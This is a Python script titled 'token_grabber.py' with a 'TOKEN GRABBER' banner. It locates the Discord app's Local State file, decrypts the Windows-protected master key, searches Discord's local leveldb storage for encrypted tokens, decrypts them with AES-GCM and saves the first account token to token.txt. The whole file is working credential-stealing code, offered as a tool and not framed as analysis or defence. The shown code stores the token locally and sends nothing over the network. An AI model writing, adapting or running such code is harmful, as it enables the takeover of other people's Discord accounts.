"""
token_grabber.py
"""
import json
import base64
import re
import win32crypt  # pip install pywin32
from Crypto.Cipher import AES  # pip install pycryptodome
import os

def clear_screen():
    # For Windows
    if os.name == 'nt':
        os.system('cls')
    # For macOS and Linux
    else:
        os.system('clear')

# Example usage
clear_screen()

import colorama
from colorama import Fore
class colors:
    DARKRED = '\033[31m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f'''{colors.RED}
  ████████╗  ██████╗  ██╗  ██╗ ███████╗ ███╗   ██╗     ██████╗  ██████╗   █████╗  ██████╗  ██████╗  ███████╗ ██████╗ 
  ╚══██╔══╝ ██╔═══██╗ ██║ ██╔╝ ██╔════╝ ████╗  ██║    ██╔════╝  ██╔══██╗ ██╔══██╗ ██╔══██╗ ██╔══██╗ ██╔════╝ ██╔══██╗
     ██║    ██║   ██║ █████╔╝  █████╗   ██╔██╗ ██║    ██║  ███╗ ██████╔╝ ███████║ ██████╔╝ ██████╔╝ █████╗   ██████╔╝
     ██║    ██║   ██║ ██╔═██╗  ██╔══╝   ██║╚██╗██║    ██║   ██║ ██╔══██╗ ██╔══██║ ██╔══██╗ ██╔══██╗ ██╔══╝   ██╔══██╗
     ██║    ╚██████╔╝ ██║  ██╗ ███████╗ ██║ ╚████║    ╚██████╔╝ ██║  ██║ ██║  ██║ ██████╔╝ ██████╔╝ ███████╗ ██║  ██║
     ╚═╝     ╚═════╝  ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═══╝     ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚══════╝ ╚═╝  ╚═╝
 
{colors.RED}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{colors.RESET}
''')

def get_discord_path():
    return os.getenv("APPDATA") + "\\discord"

def get_master_key(path):
    try:
        with open(path + "\\Local State", "r", encoding="utf-8") as file:
            local_state = json.loads(file.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
        return key
    except Exception as e:
        return None

def decrypt_payload(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return None

def extract_token(path, key):
    leveldb_path = path + "\\Local Storage\\leveldb"
    for filename in os.listdir(leveldb_path):
        if filename.endswith(".log") or filename.endswith(".ldb"):
            with open(os.path.join(leveldb_path, filename), "r", errors="ignore") as file:
                for line in file:
                    for match in re.findall(r'dQw4w9WgXcQ:[^\"]*', line):
                        encrypted_token = match.split("dQw4w9WgXcQ:")[1]
                        try:
                            decrypted = decrypt_payload(base64.b64decode(encrypted_token), key)
                            if decrypted:
                                return decrypted  # Return only the first valid token
                        except:
                            continue
    return None

validation = 0

if __name__ == "__main__":
    discord_path = get_discord_path()
    key = get_master_key(discord_path)
    if key:
        token = extract_token(discord_path, key)
        if token:
            validation = 0  # Only the valid token shown
        else:
            validation = 1
    else:
        validation = 404

if validation==0:
    with open("token.txt", 'w') as file:
        file.write(f"========================================================================\n")
        file.write(f"||                     Discord Account Token                           ||\n")  
        file.write(f"========================================================================\n")
        file.write(f"{token}\n") 
        file.write(f"========================================================================")

    print(f''+"✅ Successfully Saved Discord Account Token In token.txt\n")


# input(f"Press Enter To Exit...")